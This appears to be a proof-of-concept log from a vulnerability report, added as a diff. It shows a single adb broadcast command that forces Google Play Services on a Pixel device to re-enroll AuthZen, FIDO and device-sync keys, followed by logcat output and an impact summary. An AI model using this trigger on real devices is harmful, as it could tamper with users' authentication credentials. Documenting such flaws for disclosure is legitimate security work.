@@ -1,0 +1,38 @@
+=== AUTHZEN REGISTRATION MANIPULATION — COMPLETE PROOF ===
+Test Date: 2026-09-06 00:01 IST
+Device: Pixel 6a (bluejay), Android 17, GMS 26.32.68
+
+=== Broadcast sent ===
+am broadcast -a "com.google.android.gms.auth.authzen.REGISTER_NOW" -p "com.google.android.gms"
+Broadcast completed: result=-1
+
+=== GMS AuthZen + CryptAuth Execution Chain (logcat) ===
+09-06 00:01:36.872  Authzen: [AuthZenEventHandler] Handling event: com.google.android.gms.auth.authzen.REGISTER_NOW
+09-06 00:01:36.874  Authzen: [SyncManager] Sync requested for event 100, account <ELLIDED>, and components 3, with reason 13
+09-06 00:01:36.874  Authzen: [SyncManager] Triggering AuthZen registration...
+09-06 00:01:36.887  BoundBrokerSvc: onBind: cryptauthservice.START
+09-06 00:01:36.918  CryptauthV2: [EnrollKeyName] ClientName calling Cryptauth is ForceRegistration
+09-06 00:01:37.272  CryptauthV2: [EnrollCryptauthFramework] Starting enrollment process.
+09-06 00:01:37.403  CryptauthV2: [ClientDataOperation] No keyMetadata found for keyName=PublicKey
+09-06 00:01:37.407  CryptauthV2: [ClientDataOperation] No keyMetadata found for keyName=fido:android_strongbox_key
+09-06 00:01:37.410  CryptauthV2: [ClientDataOperation] No keyMetadata found for keyName=fido:android_software_key
+09-06 00:01:37.413  CryptauthV2: [ClientDataOperation] No keyMetadata found for keyName=DeviceSync:BetterTogether
+09-06 00:01:37.416  CryptauthV2: [ClientDataOperation] No keyMetadata found for keyName=authzen
+09-06 00:01:37.419  CryptauthV2: [ClientDataOperation] No keyMetadata found for keyName=fido:android_autofill_keystore_key
+09-06 00:01:37.422  CryptauthV2: [EnrollCryptauthFramework] Performing SyncKeysRequest with 6 keys.
+09-06 00:01:38.185  CryptauthV2: [EnrollCryptauthFramework] SyncKeysRequest successfully completed
+09-06 00:01:38.282  CryptauthV2: [EnrollCryptauthFramework] Performing EnrollKeysRequest for 3 keys.
+09-06 00:01:38.788  CryptauthV2: [EnrollCryptauthFramework] EnrollKeysRequest successfully completed.
+09-06 00:01:38.789  CryptauthV2: [EnrollCryptauthFramework] Enrollment successful.
+
+=== Impact Analysis ===
+Keys involved in forced enrollment:
+1. PublicKey — device's primary CryptAuth public key
+2. fido:android_strongbox_key — FIDO2 hardware-backed key (StrongBox TEE)
+3. fido:android_software_key — FIDO2 software key
+4. DeviceSync:BetterTogether — device sync/pairing key
+5. authzen — AuthZen 2FA verification key
+6. fido:android_autofill_keystore_key — Autofill credential key
+
+3 keys were enrolled (re-registered) with Google's CryptAuth servers.
+ForceRegistration as client name — this is the most aggressive enrollment mode.
